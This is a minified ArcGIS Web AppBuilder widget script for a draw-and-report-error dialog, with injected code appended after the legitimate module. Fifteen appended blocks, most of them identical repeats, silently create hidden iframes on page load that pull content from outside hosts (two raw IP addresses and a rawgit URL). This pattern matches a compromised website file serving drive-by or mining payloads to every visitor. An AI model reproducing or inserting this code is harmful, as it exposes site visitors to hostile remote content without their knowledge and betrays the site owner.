// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/ReportFeature/DrawErrorDialog.html":'\x3cdiv\x3e\r\n\t\x3cp style\x3d"width:90%;height:25px;margin: 20px 5px 0px 7px;"\x3e${nls.chooseALayer}: \x3c/p\x3e\r\n\t\x3cselect data-dojo-attach-point\x3d"selectLayer" class\x3d"jimu-input" style\x3d"width:90%;height:31px;margin: 5px 5px 5px 7px;"\x3e\r\n    \x3coption value\x3d""\x3e\x3c/option\x3e\r\n  \x3c/select\x3e\r\n  \r\n  \x3cp style\x3d"display: none;" data-dojo-attach-point\x3d"drawErrorInstructionsNode" style\x3d"width:90%;height:25px;margin: 5px 5px 5px 7px;" \x3e${nls.drawErrorInstructions}\x3c/p\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"drawBoxNode" style\x3d"display: none"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/array dojo/on dojo/string dojo/dom-construct dojo/dom-style dijit/_WidgetBase dijit/_TemplatedMixin dojo/query dojo/i18n!esri/nls/jsapi esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/SimpleFillSymbol esri/geometry/Polygon esri/tasks/datareviewer/ReviewerResultsTask ./InfoWindowContent dojo/text!./DrawErrorDialog.html".split(" "),function(l,g,e,m,h,f,n,p,k,q,r,t,u,v,w,x,y){var z=new r({type:"esriSMS",style:"esriSMSCircle",size:12,xoffset:0,
yoffset:0,color:[0,0,255,51],outline:{type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,128],width:1}}),A=new t({type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,51],width:2}),B=new u({type:"esriSFS",style:"esriSFSSolid",color:[0,0,255,26],outline:{type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,128],width:1}});return l([n,p],{templateString:y,baseClass:"drs-draw-error-dialog",buildRendering:function(){this.inherited(arguments);this._initDom()},_initDom:function(){var a=this.getLayerOptions();
void 0!==a&&""!==a&&h.place(a,this.selectLayer)},_setDrawBoxAttr:function(a){this.setDrawBox(a)},setDrawBox:function(a){this.drawBox=a;this.drawBox.placeAt(this.drawBoxNode);this.drawBox.setMap(this.map);this.drawBox.setPointSymbol(z);this.drawBox.setLineSymbol(A);this.drawBox.setPolygonSymbol(B)},postCreate:function(){this.inherited(arguments);this._initEvents()},startup:function(){this.inherited(arguments);this.drawBox.startup()},_initEvents:function(){var a=this;this.own(e(this.selectLayer,"change",
function(c){var b=c.target.value;c=g.filter(a.config.layers,function(a){return a.id===b});void 0!==c&&0<c.length&&void 0===a.map.getLayer(b)?a.emit("Error",{},[a.nls.errorMapService]):(q.toolbars.draw.addPoint=a.nls.drawFeatureMapPoint,b?a.startDrawing():a.cancelDrawing())}));this.own(e(this.map.infoWindow,"hide",function(){var c=k(".actionsPane");void 0!==c&&null!==c&&0<c.length&&(c[0].style.display="");a.emit("InfoWindowHide")}));this.own(e(this.drawBox,"DrawEnd",function(c,b,d){a._onDrawEnd(c,
b,d)}))},startDrawing:function(){f.set(this.drawErrorInstructionsNode,"display","");f.set(this.drawBoxNode,"display","")},cancelDrawing:function(){this.drawBox.clear();this.drawBox.deactivate();f.set(this.drawErrorInstructionsNode,"display","none");f.set(this.drawBoxNode,"display","none")},_onDrawEnd:function(a){var c=this,b=a.geometry,d;"extent"===b.type&&(d=new v(b.spatialReference),d.addRing([[b.xmin,b.ymin],[b.xmin,b.ymax],[b.xmax,b.ymax],[b.xmax,b.ymin],[b.xmin,b.ymin]]),b=d);this._resultGeometry=
b;this.drawBox.clear();this.drawBox.deactivate();if(null!==this._resultGeometry){switch(this._resultGeometry.type){case "polyline":b=this._resultGeometry.getExtent().getCenter();break;case "polygon":b=this._resultGeometry.getCentroid();break;default:b=this._resultGeometry}this.map.infoWindow.setTitle(this.nls.infoWindowTitle);this.infoWindowContent=new x({nls:this.nls,title:this.nls.draw,includeReportedBy:this.config.includeReportedBy,defaultUserName:this.config.defaultUserName,onReportSubmit:function(a){c.submitReport(a)}},
h.create("div"));this.infoWindowContent.startup();d=g.filter(c.config.layers,function(a){return a.id===c.selectLayer.value});this.infoWindowContent.set("layerName",d[0].alias);this.infoWindowContent.set("graphic",a);e.once(this.map.infoWindow,"hide",function(){c.map.setInfoWindowOnClick(!1)});this.map.infoWindow.destroyDijits();k(".actionsPane")[0].style.display="none";this.map.infoWindow.setContent(this.infoWindowContent.domNode);this.map.infoWindow.resize(300,600);this.map.infoWindow.show(b);this.emit("DrawEnd")}},
submitReport:function(a){var c=this;a.sessionId=this._sessionId;this.map.infoWindow.hide();this._reviewerResultsTask.writeResult(a,this._resultGeometry).then(function(a){c._onWriteResultComplete(a)},function(a){c._onWriteResultError(a)})},_onWriteResultComplete:function(a){a&&a.success?this.emit("Message",{},["",this.nls.reportMessage]):this.emit("Error",{}[this.nls.errorReportMessage])},_onWriteResultError:function(a){this.emit("Error",{},[a.message,a])},destroy:function(){this.drawBox&&(this.drawBox.destroy(),
this.drawBox=null);this.inherited(arguments)},reset:function(){this.selectLayer.selectedIndex=0;void 0!==this.infoWindowContent&&null!==this.infoWindowContent&&this.infoWindowContent.destroyRecursive();this.map.setInfoWindowOnClick(!1);this.cancelDrawing()},setDrsUrl:function(a){this._reviewerResultsTask=new w(a)},setReviewerSession:function(a){isNaN(a)?this._sessionId=1:this._sessionId=parseInt(a,10)},getLayerOptions:function(){var a="";g.forEach(this.config.layers,function(c){!0===c.show&&(a+=m.substitute('\x3coption value\x3d"${id}"\x3e${alias}\x3c/option\x3e',
c))});return a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});